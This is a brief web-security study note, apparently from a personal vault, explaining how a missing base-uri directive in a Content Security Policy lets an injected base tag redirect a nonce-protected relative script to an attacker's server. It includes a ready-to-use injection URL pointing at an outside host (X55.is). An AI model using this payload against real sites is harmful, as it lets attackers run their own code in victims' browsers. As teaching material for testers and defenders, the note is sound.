A [dangling markup injection](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FVulnerabilities%20%26%20Attacks%2FCross-Site%20Scripting%2FDangling%20Markup%20Injection%2FIntroduction) can be performed if the `base-uri` directive is absent in the defined CSP.

Moreover, if the page is loading a script using a relative path (i.e `<script src="/js/app.js" nonce="abcd-1234"/>`) and is using a `nonce`, attackers can abuse the `base` tag to make it load a script from a server that they control.

In order for this to work, the CSP tag or header must contain the following:
```html
<meta http-equiv="Content-Security-Policy" content="script src 'nonce-abcd1234'">
```
```http
HTTP/1.1 200 OK
...
Content-Security-Policy: script-src 'nonce-abcd1234';
```

An attacker can be used the following payload `<base href=//X55.is>` as follows:
```txt
http://target-website.com/?name=guest<base%20href=//X55.is>
```
>Note: If the vulnerable page is loaded with HTTPS, make sure to use HTTPS URL in the `base` tag.

Because of the payload `<base href=//X55.is>`, the script loading `/js/app.js` becomes `//x55.is/js/app.js`.